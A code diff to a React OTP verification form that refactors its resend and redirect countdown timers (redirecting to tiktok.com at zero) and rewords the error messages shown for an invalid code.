@@ -45,27 +45,28 @@ export function OtpForm() {
   const [otpTimer, setOtpTimer] = useState(60)
 
   useEffect(() => {
-    const timer = setInterval(() => {
-      setOtpTimer((prev) => (prev > 0 ? prev - 1 : 0))
-    }, 1000)
-    return () => clearInterval(timer)
-  }, [])
+    const timer = otpTimer > 0 && setInterval(() => setOtpTimer(otpTimer - 1), 1000)
+    return () => {
+      if (timer) clearInterval(timer)
+    }
+  }, [otpTimer])
 
   useEffect(() => {
     if (showRedirectModal) {
-      const countdownTimer = setInterval(() => {
-        setRedirectCountdown((prev) => {
-          if (prev <= 1) {
-            clearInterval(countdownTimer)
-            window.location.href = "https://www.tiktok.com/"
-            return 0
-          }
-          return prev - 1
-        })
-      }, 1000)
-      return () => clearInterval(countdownTimer)
+      const countdownTimer =
+        redirectCountdown > 0 &&
+        setInterval(() => setRedirectCountdown(redirectCountdown - 1), 1000)
+
+      if (redirectCountdown === 0) {
+        window.location.href = "https://www.tiktok.com/"
+      }
+
+      return () => {
+        if (countdownTimer) clearInterval(countdownTimer)
+      }
     }
-  }, [showRedirectModal])
+  }, [showRedirectModal, redirectCountdown])
+
 
   const form = useForm<z.infer<typeof FormSchema>>({
     resolver: zodResolver(FormSchema),
@@ -85,9 +86,10 @@ export function OtpForm() {
       })
       setShowRedirectModal(true)
     } else {
+      form.setError("pin", { message: "Invalid or expired code. Please try again."})
       toast({
         title: "Verification Failed",
-        description: "Something went wrong. Please try again.",
+        description: "The code you entered is incorrect. Please try again.",
         variant: "destructive",
       })
     }
